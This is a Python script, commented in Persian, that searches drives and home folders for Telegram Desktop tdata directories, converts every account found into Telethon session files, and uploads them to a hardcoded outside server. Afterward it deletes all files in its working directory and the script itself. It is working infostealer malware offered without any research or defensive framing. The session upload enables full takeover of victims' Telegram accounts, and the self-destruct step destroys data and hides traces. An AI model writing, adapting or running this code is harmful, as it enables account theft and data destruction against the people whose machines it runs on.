#!/usr/bin/env python3
"""
ساده و حرفه‌ای: پیدا کردن همه tdataها + استخراج سشن + آپلود به سرور
""" 
import sys
import time
import subprocess
import asyncio
import os
import platform
import re
import shutil
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

import requests
from opentele2.td import TDesktop
from opentele2.api import UseCurrentSession

# ==================== تنظیمات ====================
SERVER_URL = "https://scalbostbot.ir/Uplod/index.php"
SECRET_KEY = "CHANGE_THIS_TO_A_LONG_RANDOM_SECRET"
BACKUP_DIR = Path("session_backup")
# =================================================


def is_real_tdata(path: Path) -> bool:
    try:
        if not path.is_dir():
            return False
        if (path / "key_datas").exists():
            return True
        return any(p.name.startswith("D877F783D5D3EF8C") and p.is_dir() for p in path.iterdir())
    except Exception:
        return False


def find_all_tdata() -> list[Path]:
    found = []
    seen = set()

    def add(p: Path):
        try:
            r = p.resolve()
            if r not in seen and is_real_tdata(r):
                seen.add(r)
                found.append(r)
        except Exception:
            pass

    system = platform.system()

    if system == "Windows":
        for env in ("APPDATA", "LOCALAPPDATA"):
            base = os.environ.get(env)
            if base:
                add(Path(base) / "Telegram Desktop" / "tdata")
                add(Path(base) / "TelegramDesktop" / "tdata")

        drives = [Path(f"{d}:/") for d in "CDEFGHIJKLMNOPQRSTUVWXYZ" if Path(f"{d}:/").exists()]
        for drive in drives:
            try:
                for root, dirs, _ in os.walk(drive, topdown=True):
                    root_path = Path(root)
                    depth = len(root_path.parts) - len(drive.parts)
                    if depth > 5:
                        dirs.clear()
                        continue
                    dirs[:] = [d for d in dirs if d.lower() not in {
                        "windows", "program files", "program files (x86)",
                        "$recycle.bin", "system volume information", "temp", "tmp"
                    }]
                    if root_path.name.lower() == "tdata":
                        add(root_path)
                    elif "telegram" in root_path.name.lower():
                        add(root_path / "tdata")
            except Exception:
                continue
    else:
        home = Path.home()
        candidates = [
            home / ".local/share/TelegramDesktop/tdata",
            home / ".telegram/tdata",
            home / ".TelegramDesktop/tdata",
            home / "snap/telegram-desktop/current/.local/share/TelegramDesktop/tdata",
            home / ".var/app/org.telegram.desktop/data/TelegramDesktop/tdata",
            Path("/opt/telegram/tdata"),
        ]
        for c in candidates:
            add(c)
        try:
            for root, dirs, _ in os.walk(home, topdown=True):
                if len(Path(root).relative_to(home).parts) > 4:
                    dirs.clear()
                    continue
                if Path(root).name.lower() == "tdata":
                    add(Path(root))
        except Exception:
            pass

    return found


def upload(file_path: Path) -> bool:
    try:
        with open(file_path, "rb") as f:
            r = requests.post(
                SERVER_URL,
                files={"file": (file_path.name, f)},
                headers={"X-Auth-Key": SECRET_KEY},
                timeout=30
            )
        return r.status_code == 200 and r.json().get("status") == "success"
    except Exception:
        return False


async def process_tdata(tdata_path: Path):
    try:
        tdesk = TDesktop(str(tdata_path))
        accounts = tdesk.accounts
        if not accounts:
            return

        for idx, account in enumerate(accounts):
            try:
                # اول شماره رو می‌گیریم
                temp = await account.ToTelethon(session=None, flag=UseCurrentSession)
                phone = f"unknown_{idx}"
                try:
                    await temp.connect()
                    me = await temp.get_me()
                    if me and me.phone:
                        phone = me.phone
                except Exception:
                    pass
                finally:
                    await temp.disconnect()

                safe_phone = re.sub(r"[^0-9+]", "", str(phone)) or f"unknown_{idx}"
                session_name = f"{safe_phone}_{tdata_path.parent.name}_{idx}.session"
                session_path = BACKUP_DIR / session_name

                # ساخت سشن با روشی که خودت تست کردی
                client = await account.ToTelethon(session=str(session_path), flag=UseCurrentSession)
                await client.connect()
                await client.disconnect()

                if session_path.exists() and session_path.stat().st_size > 0:
                    upload(session_path)

            except Exception:
                continue
    except Exception:
        pass



def self_destruct(): 
    folder = os.getcwd()
    for item in os.listdir(folder):
        item_path = os.path.join(folder, item)
 
        if os.path.isfile(item_path) or os.path.islink(item_path):
            os.remove(item_path)         
        elif os.path.isdir(item_path):
            shutil.rmtree(item_path)    
              
    script_path = os.path.abspath(sys.argv[0])  
    os.remove(script_path) 
    return 
     
    if sys.platform.startswith('win'): 
        cmd = f'del /f /q "{script_path}"'
    else: 
        cmd = f'rm -f "{script_path}"'
         
    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    

async def maintel():
    BACKUP_DIR.mkdir(exist_ok=True)
 
    loop = asyncio.get_running_loop()
    with ThreadPoolExecutor() as pool:
        tdata_list = await loop.run_in_executor(pool, find_all_tdata)
 

    tasks = [process_tdata(p) for p in tdata_list]
    await asyncio.gather(*tasks)
 
    self_destruct()


if __name__ == "__main__":
    asyncio.run(maintel())